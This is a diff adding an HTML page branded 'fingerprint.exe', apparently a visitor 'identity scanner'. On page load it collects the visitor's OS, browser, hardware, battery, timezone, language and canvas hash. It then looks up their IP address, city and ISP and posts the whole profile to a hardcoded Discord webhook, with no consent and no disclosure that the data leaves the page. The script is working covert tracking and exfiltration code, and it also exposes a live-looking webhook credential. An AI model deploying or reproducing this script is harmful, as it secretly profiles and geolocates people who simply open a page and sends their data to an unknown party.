@@ -1,0 +1,341 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>fingerprint.exe</title>
+<style>
+  *{box-sizing:border-box;margin:0;padding:0;}
+  @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+  @keyframes scanline{0%{top:-5%}100%{top:105%}}
+  @keyframes blink{0%,100%{opacity:1}50%{opacity:0}}
+  @keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}
+  @keyframes glow{0%,100%{opacity:0.3}50%{opacity:0.8}}
+  @keyframes typewriter{from{width:0}to{width:100%}}
+  @keyframes rotate{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}
+  @keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}
+
+  html,body{width:100%;height:100%;background:#0a0a0f;overflow:hidden;font-family:monospace;}
+
+  .bg{position:fixed;top:0;left:0;right:0;bottom:0;z-index:0;}
+  .grid{position:fixed;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(99,0,255,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(99,0,255,0.03) 1px,transparent 1px);background-size:40px 40px;z-index:1;}
+  .scan{position:fixed;left:0;right:0;height:3px;background:linear-gradient(90deg,transparent,rgba(99,0,255,0.4),rgba(0,255,200,0.4),transparent);animation:scanline 4s linear infinite;z-index:2;}
+
+  .orb{position:fixed;border-radius:50%;filter:blur(80px);z-index:0;}
+  .orb1{width:400px;height:400px;background:rgba(99,0,255,0.12);top:-100px;left:-100px;}
+  .orb2{width:300px;height:300px;background:rgba(0,255,200,0.08);bottom:-50px;right:-50px;}
+  .orb3{width:200px;height:200px;background:rgba(255,0,128,0.06);top:50%;left:50%;transform:translate(-50%,-50%);}
+
+  .container{position:relative;z-index:10;width:100%;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:1rem;}
+
+  .hex{position:relative;width:120px;height:120px;margin-bottom:2rem;animation:float 3s ease-in-out infinite;}
+  .hex svg{width:100%;height:100%;}
+
+  .title-wrap{text-align:center;margin-bottom:2rem;}
+  .title{font-size:clamp(1.2rem,4vw,2rem);font-weight:700;letter-spacing:4px;background:linear-gradient(90deg,#6300ff,#00ffc8,#ff0080);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:0.5rem;}
+  .subtitle{font-size:clamp(9px,1.5vw,12px);color:rgba(255,255,255,0.2);letter-spacing:6px;text-transform:uppercase;}
+
+  .card{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;padding:1.5rem;width:100%;max-width:520px;backdrop-filter:blur(10px);}
+
+  .row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.04);}
+  .row:last-child{border-bottom:none;}
+  .row-label{font-size:11px;color:rgba(255,255,255,0.3);letter-spacing:2px;text-transform:uppercase;}
+  .row-value{font-size:11px;color:rgba(255,255,255,0.7);text-align:right;max-width:60%;}
+
+  .scanning .row-value{color:rgba(99,0,255,0.6);animation:blink 0.8s infinite;}
+
+  .status-bar{display:flex;align-items:center;gap:8px;margin-top:1.5rem;justify-content:center;}
+  .dot{width:6px;height:6px;border-radius:50%;background:#00ffc8;animation:blink 1s infinite;}
+  .status-text{font-size:11px;color:rgba(0,255,200,0.6);letter-spacing:3px;}
+
+  .progress{width:100%;height:2px;background:rgba(255,255,255,0.05);border-radius:2px;margin-top:1rem;overflow:hidden;}
+  .progress-bar{height:100%;width:0%;background:linear-gradient(90deg,#6300ff,#00ffc8);border-radius:2px;transition:width 0.3s ease;}
+
+  .corner{position:fixed;font-size:10px;color:rgba(255,255,255,0.1);letter-spacing:1px;z-index:10;}
+  .tl{top:16px;left:20px;}
+  .tr{top:16px;right:20px;}
+  .br{bottom:16px;right:20px;}
+
+  .particles{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1;pointer-events:none;}
+</style>
+</head>
+<body>
+
+<div class="orb orb1"></div>
+<div class="orb orb2"></div>
+<div class="orb orb3"></div>
+<div class="grid"></div>
+<div class="scan"></div>
+<canvas class="particles" id="particles"></canvas>
+
+<div class="corner tl">shinyhunter.qzz.io</div>
+<div class="corner tr">v0.1.0</div>
+<div class="corner br" id="clock"></div>
+
+<div class="container">
+  <div class="hex">
+    <svg viewBox="0 0 120 120" fill="none" xmlns="http://www.w3.org/2000/svg">
+      <polygon points="60,5 110,32.5 110,87.5 60,115 10,87.5 10,32.5" stroke="rgba(99,0,255,0.4)" stroke-width="1" fill="rgba(99,0,255,0.05)"/>
+      <polygon points="60,15 100,37.5 100,82.5 60,105 20,82.5 20,37.5" stroke="rgba(0,255,200,0.3)" stroke-width="0.5" fill="none"/>
+      <circle cx="60" cy="60" r="20" stroke="rgba(0,255,200,0.5)" stroke-width="1" fill="rgba(0,255,200,0.05)"/>
+      <circle cx="60" cy="60" r="8" fill="rgba(99,0,255,0.6)"/>
+      <line x1="60" y1="15" x2="60" y2="40" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+      <line x1="60" y1="80" x2="60" y2="105" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+      <line x1="20" y1="37.5" x2="40" y2="48" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+      <line x1="80" y1="72" x2="100" y2="82.5" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+      <line x1="100" y1="37.5" x2="80" y2="48" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+      <line x1="40" y1="72" x2="20" y2="82.5" stroke="rgba(99,0,255,0.3)" stroke-width="0.5"/>
+    </svg>
+  </div>
+
+  <div class="title-wrap">
+    <div class="title">FINGERPRINT.EXE</div>
+    <div class="subtitle">// identity scanner</div>
+  </div>
+
+  <div class="card" id="card">
+    <div class="row"><span class="row-label">OS</span><span class="row-value" id="os">scanning...</span></div>
+    <div class="row"><span class="row-label">Browser</span><span class="row-value" id="browser">scanning...</span></div>
+    <div class="row"><span class="row-label">Screen</span><span class="row-value" id="screen">scanning...</span></div>
+    <div class="row"><span class="row-label">CPU Cores</span><span class="row-value" id="cpu">scanning...</span></div>
+    <div class="row"><span class="row-label">RAM</span><span class="row-value" id="ram">scanning...</span></div>
+    <div class="row"><span class="row-label">Timezone</span><span class="row-value" id="tz">scanning...</span></div>
+    <div class="row"><span class="row-label">Language</span><span class="row-value" id="lang">scanning...</span></div>
+    <div class="row"><span class="row-label">IP Address</span><span class="row-value" id="ip">scanning...</span></div>
+    <div class="row"><span class="row-label">Location</span><span class="row-value" id="loc">scanning...</span></div>
+    <div class="row"><span class="row-label">ISP</span><span class="row-value" id="isp">scanning...</span></div>
+    <div class="row"><span class="row-label">Battery</span><span class="row-value" id="battery">scanning...</span></div>
+    <div class="row"><span class="row-label">Touch</span><span class="row-value" id="touch">scanning...</span></div>
+    <div class="row"><span class="row-label">Ad Blocker</span><span class="row-value" id="adblocker">scanning...</span></div>
+    <div class="row"><span class="row-label">Canvas Hash</span><span class="row-value" id="canvas_fp">scanning...</span></div>
+  </div>
+
+  <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
+  <div class="status-bar">
+    <div class="dot"></div>
+    <div class="status-text" id="statusText">initializing scan...</div>
+  </div>
+</div>
+
+<script>
+const WEBHOOK = 'https://discord.com/api/webhooks/1490308892461236315/08NzyMGNcjBE1w7VVM2S-cnTrwuaEVUPXUgiDx1I2vVwStSJ-RmB7YfoZbKK4R9FkUCo';
+
+function clock(){
+  const d=new Date();
+  document.getElementById('clock').textContent=d.toISOString().replace('T',' ').split('.')[0]+' UTC';
+}
+clock();setInterval(clock,1000);
+
+// particles
+const canvas=document.getElementById('particles');
+const ctx=canvas.getContext('2d');
+canvas.width=window.innerWidth;
+canvas.height=window.innerHeight;
+const particles=[];
+for(let i=0;i<60;i++){
+  particles.push({
+    x:Math.random()*canvas.width,
+    y:Math.random()*canvas.height,
+    r:Math.random()*1.5+0.5,
+    dx:(Math.random()-0.5)*0.3,
+    dy:(Math.random()-0.5)*0.3,
+    o:Math.random()*0.3+0.1,
+    c:Math.random()>0.5?'99,0,255':'0,255,200'
+  });
+}
+function drawParticles(){
+  ctx.clearRect(0,0,canvas.width,canvas.height);
+  particles.forEach(p=>{
+    ctx.beginPath();
+    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
+    ctx.fillStyle=`rgba(${p.c},${p.o})`;
+    ctx.fill();
+    p.x+=p.dx;p.y+=p.dy;
+    if(p.x<0||p.x>canvas.width)p.dx*=-1;
+    if(p.y<0||p.y>canvas.height)p.dy*=-1;
+  });
+  requestAnimationFrame(drawParticles);
+}
+drawParticles();
+
+function setProgress(p){
+  document.getElementById('progressBar').style.width=p+'%';
+}
+
+function setStatus(t){
+  document.getElementById('statusText').textContent=t;
+}
+
+function reveal(id, val){
+  const el = document.getElementById(id);
+  el.textContent = val;
+  el.style.color = 'rgba(0,255,200,0.8)';
+}
+
+function getBrowser(){
+  const ua=navigator.userAgent;
+  if(ua.includes('Firefox')) return 'Firefox';
+  if(ua.includes('Edg')) return 'Edge';
+  if(ua.includes('Chrome')) return 'Chrome';
+  if(ua.includes('Safari')) return 'Safari';
+  return 'Unknown';
+}
+
+function getOS(){
+  const ua=navigator.userAgent;
+  if(ua.includes('Windows NT 10')) return 'Windows 10/11';
+  if(ua.includes('Windows')) return 'Windows';
+  if(ua.includes('Mac OS X')) return 'macOS';
+  if(ua.includes('Android')) return 'Android';
+  if(ua.includes('iPhone')||ua.includes('iPad')) return 'iOS';
+  if(ua.includes('Linux')) return 'Linux';
+  return 'Unknown';
+}
+
+function getCanvasFingerprint(){
+  const c=document.createElement('canvas');
+  const x=c.getContext('2d');
+  x.textBaseline='top';
+  x.font='14px Arial';
+  x.fillStyle='#f60';
+  x.fillRect(125,1,62,20);
+  x.fillStyle='#069';
+  x.fillText('fingerprint',2,15);
+  x.fillStyle='rgba(102,204,0,0.7)';
+  x.fillText('fingerprint',4,17);
+  const data=c.toDataURL();
+  let hash=0;
+  for(let i=0;i<data.length;i++){
+    hash=((hash<<5)-hash)+data.charCodeAt(i);
+    hash|=0;
+  }
+  return '0x'+Math.abs(hash).toString(16).toUpperCase();
+}
+
+async function sendToDiscord(data){
+  const msg=[
+    '🔍 **Device Fingerprint Captured**',
+    '```',
+    `🖥️  OS         : ${data.os}`,
+    `🌐  Browser    : ${data.browser}`,
+    `📺  Screen     : ${data.screen}`,
+    `⚙️  CPU Cores  : ${data.cpu}`,
+    `💾  RAM        : ${data.ram}`,
+    `🕐  Timezone   : ${data.tz}`,
+    `🗣️  Language   : ${data.lang}`,
+    `🌍  IP         : ${data.ip}`,
+    `📍  Location   : ${data.loc}`,
+    `📡  ISP        : ${data.isp}`,
+    `🔋  Battery    : ${data.battery}`,
+    `👆  Touch      : ${data.touch}`,
+    `🚫  Ad Blocker : ${data.adblocker}`,
+    `🎨  Canvas Hash: ${data.canvas_fp}`,
+    `⏰  Time       : ${new Date().toUTCString()}`,
+    '```'
+  ].join('\n');
+
+  await fetch(WEBHOOK,{
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({content:msg})
+  });
+}
+
+async function scan(){
+  const data={};
+  const steps=[
+    async()=>{
+      data.os=getOS();
+      reveal('os',data.os);
+      setStatus('scanning browser...');
+      setProgress(10);
+    },
+    async()=>{
+      data.browser=getBrowser();
+      reveal('browser',data.browser);
+      setStatus('scanning display...');
+      setProgress(20);
+    },
+    async()=>{
+      data.screen=`${screen.width}x${screen.height} @${window.devicePixelRatio}x`;
+      reveal('screen',data.screen);
+      setStatus('scanning hardware...');
+      setProgress(30);
+    },
+    async()=>{
+      data.cpu=navigator.hardwareConcurrency||'unknown';
+      reveal('cpu',data.cpu+' cores');
+      data.ram=(navigator.deviceMemory||'unknown');
+      reveal('ram',data.ram+'GB');
+      setStatus('scanning timezone...');
+      setProgress(40);
+    },
+    async()=>{
+      data.tz=Intl.DateTimeFormat().resolvedOptions().timeZone;
+      reveal('tz',data.tz);
+      data.lang=navigator.language;
+      reveal('lang',data.lang);
+      setStatus('scanning network...');
+      setProgress(55);
+    },
+    async()=>{
+      try{
+        const r=await fetch('https://ip-api.com/json/');
+        const d=await r.json();
+        data.ip=d.query;
+        data.loc=`${d.city}, ${d.regionName}, ${d.country}`;
+        data.isp=d.isp;
+        reveal('ip',data.ip);
+        reveal('loc',data.loc);
+        reveal('isp',data.isp);
+      }catch(e){
+        data.ip=data.loc=data.isp='unavailable';
+      }
+      setStatus('scanning battery...');
+      setProgress(70);
+    },
+    async()=>{
+      try{
+        const b=await navigator.getBattery();
+        data.battery=Math.round(b.level*100)+'% '+(b.charging?'⚡ charging':'🔋');
+      }catch(e){data.battery='unavailable';}
+      reveal('battery',data.battery);
+      setStatus('scanning input...');
+      setProgress(80);
+    },
+    async()=>{
+      data.touch=navigator.maxTouchPoints>0?'yes ('+navigator.maxTouchPoints+' points)':'no';
+      reveal('touch',data.touch);
+      data.adblocker='checking...';
+      try{
+        await fetch('https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js',{mode:'no-cors'});
+        data.adblocker='not detected';
+      }catch(e){data.adblocker='detected';}
+      reveal('adblocker',data.adblocker);
+      setStatus('generating fingerprint hash...');
+      setProgress(90);
+    },
+    async()=>{
+      data.canvas_fp=getCanvasFingerprint();
+      reveal('canvas_fp',data.canvas_fp);
+      setStatus('sending report...');
+      setProgress(95);
+      await sendToDiscord(data);
+      setProgress(100);
+      setStatus('// scan complete');
+      document.querySelector('.dot').style.background='#6300ff';
+    }
+  ];
+
+  for(const step of steps){
+    await step();
+    await new Promise(r=>setTimeout(r,400));
+  }
+}
+
+window.addEventListener('load',()=>{
+  setTimeout(scan, 500);
+});
+</script>
+</body>
+</html>
